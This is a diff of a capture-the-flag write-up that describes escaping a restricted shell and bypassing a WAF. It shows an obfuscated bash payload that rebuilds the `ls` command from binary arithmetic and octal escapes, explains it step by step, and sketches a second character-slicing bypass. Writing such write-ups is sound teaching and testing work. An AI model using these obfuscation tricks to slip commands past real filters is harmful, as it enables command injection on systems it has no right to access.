@@ -20,6 +20,7 @@ Luckily, just a few days before a friend showed me a WAF bypass he found using b
 ```
 ${0}<<<$\'\\$(($((1<<1))#10011010))\\$(($((1<<1))#10100011))\'
 ```
+
 This is just a `ls` command.
 Breaking it into parts:
 - `${0}` in your terminal will mean the shell you're in, in this case, `bash`
@@ -30,12 +31,15 @@ Breaking it into parts:
 - `10100011` is decimal `163` represented in binary. When preceded with a `\`, most shells will take it as octal. \163 = `s`
 
 So in steps what we've got:
+
 `bash<<<$\'\\$((2#10011010))\\$((2#10100011))\'`
 
 then:
+
 `bash<<<$\'\\154\\163\'`
 
 then:
+
 `bash<<<$\'ls'`
 
 Basically it's a bypass that uses a very strict and small charset. My mind went instantly there.
@@ -68,9 +72,9 @@ then i just had to get the flag:
 
 <img width="726" alt="image" src="https://user-images.githubusercontent.com/2973929/234142293-7f6fe5fd-d15c-402e-b088-2e1852c219fc.png">
 
-## Solution 2:
+## Solution 2
 
-I mean... I was happy that I had solved that challenge, but I spent the rest of the days thinking my solution was overkill. As I ended up having a way to run any command I wanted, I could, for example, read the code for the limited shell:
+I mean... I was happy that I had solved that challenge, but I spent the next days thinking my solution was overkill. As I ended up having a way to run any command I wanted, I could, for example, read the code for the limited shell:
 
 ```python
 #!/bin/usr/env python3
@@ -117,6 +121,7 @@ if __name__ == '__main__':
 ```
 
 So I was sure it could be done "easier".
+
 After checking `env`, I found out that there was a variable named REMOTE_HOST that held the IP connected to the box.
 So that's what I came up with:
 
@@ -142,7 +147,4 @@ A=ABCDEFGHIJKLMNOPQRSTUVWXYZ;B=$A${A,,}0123456789_/${REMOTE_HOST//[0-9]/};${B:63
 ```
 
 <img width="722" alt="image" src="https://user-images.githubusercontent.com/2973929/234144048-423e3a2c-0ed6-4fdd-9a27-620927876c5b.png">
-
-
-
 
